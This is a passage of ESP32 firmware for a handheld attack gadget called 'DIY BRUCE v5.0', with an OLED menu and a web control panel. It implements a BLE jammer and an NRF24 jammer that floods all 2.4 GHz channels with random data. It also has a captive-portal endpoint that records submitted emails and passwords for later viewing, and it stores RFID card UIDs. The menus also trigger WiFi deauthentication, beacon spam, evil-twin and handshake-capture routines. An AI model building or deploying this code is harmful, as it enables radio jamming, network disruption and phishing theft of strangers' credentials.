void bleAndroid(){
    showMsg("ANDROID",1000);
    for(int i=0;i<30;i++){String n="Android_"+String(random(10000));sendBLE(n.c_str(),nullptr,0);if(btn(BTN_BACK))break;delay(30);}
}
void bleWindows(){
    showMsg("WINDOWS",1000);
    for(int i=0;i<30;i++){String n="Windows_"+String(random(10000));sendBLE(n.c_str(),nullptr,0);if(btn(BTN_BACK))break;delay(30);}
}
void bleJam(){
    bleJamActive=true;
    showMsg("BLE JAMMER",1000);
    while(bleJamActive){
        String r="JAM_"+String(random(99999));
        BLEDevice::init(r.c_str());
        BLEAdvertising* adv=BLEDevice::getAdvertising();
        BLEAdvertisementData d;d.setFlags(0x06);d.setName(r);
        adv->setAdvertisementData(d);adv->start();delay(20);adv->stop();
        BLEDevice::deinit();
        if(btn(BTN_BACK))bleJamActive=false;
        delay(10);
    }
}
void stopBleJam(){bleJamActive=false;}

void initNRF(){
    if(!radio.begin()){nrfOK=false;showMsg("NRF24 not found!",1500);return;}
    radio.setChannel(nrfCh);radio.setPALevel(RF24_PA_LOW);radio.setAutoAck(false);
    nrfOK=true;showMsg("NRF24 ready",1000);
}
void scanNRF(){
    if(!nrfOK){showMsg("NRF24 missing!",1000);return;}
    int a=0;
    for(int ch=0;ch<=125;ch++){
        radio.setChannel(ch);radio.startListening();delayMicroseconds(200);
        if(radio.testCarrier())a++;
        radio.stopListening();
    }
    radio.setChannel(nrfCh);
    char b[32];sprintf(b,"Active: %d",a);showMsg(b,1500);
}
void startNRFJam(){
    if(!nrfOK){showMsg("NRF24 missing!",1000);return;}
    nrfJamActive=true;radio.stopListening();
    showMsg("NRF JAMMER",1000);
    while(nrfJamActive){
        for(int ch=0;ch<=125&&nrfJamActive;ch++){
            radio.setChannel(ch);
            uint8_t j[32];for(int i=0;i<32;i++)j[i]=random(256);
            radio.write(&j,32);
        }
        if(btn(BTN_BACK))nrfJamActive=false;
        delay(5);
    }
    radio.setChannel(nrfCh);
}
void stopNRFJam(){nrfJamActive=false;}

void initRFID(){
    SPI.begin(18,19,23,5);
    rfid.PCD_Init();
    showMsg("RFID ready",1000);
}
void readRFID(){
    showMsg("Place card...",1000);
    if(!rfid.PICC_IsNewCardPresent()){showMsg("No card",1000);return;}
    if(!rfid.PICC_ReadCardSerial()){showMsg("Read error",1000);return;}
    String uid="";
    for(byte i=0;i<rfid.uid.size;i++){uid+=String(rfid.uid.uidByte[i],HEX);if(i<rfid.uid.size-1)uid+=":";}
    capturedPasswords+="[RFID] "+uid+"\\n";
    saveData();
    char b[64];sprintf(b,"UID: %s",uid.c_str());showMsg(b,2000);
    rfid.PICC_HaltA();
}

#include <IRsend.h>
IRsend irsend(IR_LED);
void initIR(){irsend.begin();showMsg("IR ready",1000);}
void irPower(){irsend.sendNEC(0x00FF00FF,32);showMsg("IR POWER",500);}
void irVolUp(){irsend.sendNEC(0x00FF40BF,32);showMsg("IR VOL+",500);}
void irVolDown(){irsend.sendNEC(0x00FFC03F,32);showMsg("IR VOL-",500);}

const char index_html[] PROGMEM = "#include \"index.html\"";
const char portal_html[] PROGMEM = "#include \"portal.html\"";

void handleRoot(){server.send(200,"text/html",index_html);}
void handlePortal(){server.send(200,"text/html",portal_html);}
void handleData(){
    String j="{\\"deauth\\":"+String(deauthPackets)+",\\"beacon\\":"+String(beaconPackets)+",\\"rssi\\":"+String(lastRSSI)+",\\"uptime\\":"+String(millis()/1000)+"}";
    server.send(200,"application/json",j);
}
void handleCmd(){
    if(!server.hasArg("c")){server.send(200,"text/plain","NO CMD");return;}
    String c=server.arg("c");
    if(c=="scan")scanWiFi();
    else if(c=="deauth_start")startDeauth();
    else if(c=="deauth_stop")stopDeauth();
    else if(c=="beacon_start")startBeacon();
    else if(c=="beacon_stop")stopBeacon();
    else if(c=="evil_start")startEvil();
    else if(c=="evil_stop")stopEvil();
    else if(c=="handshake")startHandshake();
    else if(c=="ble_apple")bleApple();
    else if(c=="ble_samsung")bleSamsung();
    else if(c=="ble_android")bleAndroid();
    else if(c=="ble_windows")bleWindows();
    else if(c=="ble_jam")bleJam();
    else if(c=="nrf_scan")scanNRF();
    else if(c=="nrf_jam")startNRFJam();
    else if(c=="nrf_stop")stopNRFJam();
    else if(c=="rfid_read")readRFID();
    else if(c=="ir_power")irPower();
    else if(c=="view_pass")server.send(200,"text/plain",capturedPasswords.length()?capturedPasswords:"(empty)");
    else if(c=="clear_pass")clearData();
    else if(c=="reboot")reboot();
    else server.send(200,"text/plain","OK");
    server.send(200,"text/plain","OK");
}
void startWeb(){
    if(webRunning)return;
    WiFi.softAP("DIY_BRUCE","bruce1234");
    server.on("/",handleRoot);
    server.on("/cmd",handleCmd);
    server.on("/data",handleData);
    server.on("/pass",HTTP_POST,[](){
        if(server.hasArg("email")||server.hasArg("password")){
            capturedPasswords+="[PASS] "+server.arg("email")+" | "+server.arg("password")+"\\n";
            saveData();
        }
        server.send(200,"text/html","<html><body><h3>OK</h3></body></html>");
    });
    server.begin();
    webRunning=true;
    showMsg("WEB: 192.168.4.1",2000);
}
void stopWeb(){
    if(!webRunning)return;
    server.stop();WiFi.softAPdisconnect(true);
    webRunning=false;
    showMsg("WEB stopped",1000);
}

struct MenuItem{const char* n;const unsigned char* i;};
MenuItem m[]={{"WiFi",wifi_bits},{"BLE",ble_bits},{"NRF24",nrf_bits},{"RFID",rfid_bits},{"IR",ir_bits},{"Settings",settings_bits}};
int mi=0,si=0;
const char* wSub[]={"SCAN","DEAUTH","BEACON","EVIL","HANDSHAKE","VIEW PASS","CLEAR","WEB ON","REBOOT"};
const char* bSub[]={"SCAN","APPLE","SAMSUNG","ANDROID","WINDOWS","JAM","STOP"};
const char* nSub[]={"SCAN","JAM","STOP"};
const char* rSub[]={"READ"};
const char* iSub[]={"POWER","VOL+","VOL-"};
const char* sSub[]={"WEB ON","WEB OFF","CLEAR","INFO","REBOOT"};
int S[]={9,7,3,1,3,5};
enum{S_MENU,S_SUB}state=S_MENU;

void drawMain(){
    u8g2.clearBuffer();drawTopBar();
    u8g2.drawXBM(48,16,32,32,m[mi].i);
    u8g2.setFont(u8g2_font_9x15B_tr);
    u8g2.drawStr(4,36,"<");u8g2.drawStr(114,36,">");
    u8g2.setFont(u8g2_font_7x13B_tr);
    int w=u8g2.getStrWidth(m[mi].n);
    u8g2.drawStr((128-w)/2,58,m[mi].n);
    u8g2.sendBuffer();
}
void drawSub(){
    const char** it;int sz;
    switch(mi){case 0:it=wSub;sz=S[0];break;case 1:it=bSub;sz=S[1];break;case 2:it=nSub;sz=S[2];break;case 3:it=rSub;sz=S[3];break;case 4:it=iSub;sz=S[4];break;default:it=sSub;sz=S[5];break;}
    u8g2.clearBuffer();drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr((128-u8g2.getStrWidth(m[mi].n))/2,10,m[mi].n);
    for(int i=0;i<sz;i++){
        int y=24+i*10;
        if(i==si){u8g2.drawBox(0,y-8,128,10);u8g2.setDrawColor(0);u8g2.drawStr(14,y,it[i]);u8g2.setDrawColor(1);}
        else u8g2.drawStr(14,y,it[i]);
    }
    u8g2.drawHLine(0,55,128);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(2,63,"UP/DN=sel OK=enter BACK=menu");
    u8g2.sendBuffer();
}
void exec(){
    switch(mi){
        case 0:
            switch(si){case 0:scanWiFi();break;case 1:startDeauth();break;case 2:startBeacon();break;case 3:startEvil();break;case 4:startHandshake();break;case 5:showMsg(capturedPasswords.c_str(),2000);break;case 6:clearData();break;case 7:startWeb();break;case 8:reboot();break;}
            break;
        case 1:
            switch(si){case 0:scanBLE();break;case 1:bleApple();break;case 2:bleSamsung();break;case 3:bleAndroid();break;case 4:bleWindows();break;case 5:bleJam();break;case 6:stopBleJam();break;}
            break;
        case 2:
            switch(si){case 0:scanNRF();break;case 1:startNRFJam();break;case 2:stopNRFJam();break;}
            break;
        case 3:
            switch(si){case 0:readRFID();break;}
            break;
        case 4:
            switch(si){case 0:irPower();break;case 1:irVolUp();break;case 2:irVolDown();break;}
            break;
        case 5:
            switch(si){case 0:startWeb();break;case 1:stopWeb();break;case 2:clearData();break;case 3:showMsg("DIY BRUCE v5.0",1500);break;case 4:reboot();break;}
            break;
    }
}

void setup(){
    Serial.begin(115200);
    pinMode(BTN_UP,INPUT_PULLUP);pinMode(BTN_DOWN,INPUT_PULLUP);pinMode(BTN_OK,INPUT_PULLUP);
    pinMode(BTN_LEFT,INPUT_PULLUP);pinMode(BTN_RIGHT,INPUT_PULLUP);pinMode(BTN_BACK,INPUT_PULLUP);
    Wire.begin(21,22);
    u8g2.begin();u8g2.setContrast(200);
    SPI.begin(18,19,23,5);
    initRFID();initIR();initNRF();
    loadData();
    for(int x=128;x>=0;x-=8){u8g2.clearBuffer();u8g2.setFont(u8g2_font_logisoso24_tr);u8g2.drawStr(x+4,32,"DIY");u8g2.setFont(u8g2_font_7x13B_tr);u8g2.drawStr(x+4,48,"BRUCE");u8g2.sendBuffer();delay(10);}
    delay(500);
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeCallback);
    state=S_MENU;drawMain();
    showMsg("DIY BRUCE v5.0 ready",1500);
}
void loop(){
    if(webRunning)server.handleClient();
    switch(state){
        case S_MENU:
            if(btn(BTN_LEFT)){mi=(mi-1+6)%6;drawMain();}
            else if(btn(BTN_RIGHT)){mi=(mi+1)%6;drawMain();}
            else if(btn(BTN_OK)||btn(BTN_DOWN)){state=S_SUB;si=0;drawSub();}
            break;
        case S_SUB:
            int sz;
            switch(mi){case 0:sz=S[0];break;case 1:sz=S[1];break;case 2:sz=S[2];break;case 3:sz=S[3];break;case 4:sz=S[4];break;default:sz=S[5];break;}
            if(btn(BTN_UP)){si=(si-1+sz)%sz;drawSub();}
            else if(btn(BTN_DOWN)){si=(si+1)%sz;drawSub();}
            else if(btn(BTN_OK)){exec();state=S_MENU;drawMain();}
            else if(btn(BTN_BACK)){state=S_MENU;drawMain();}
            break;
    }
    delay(20);
}
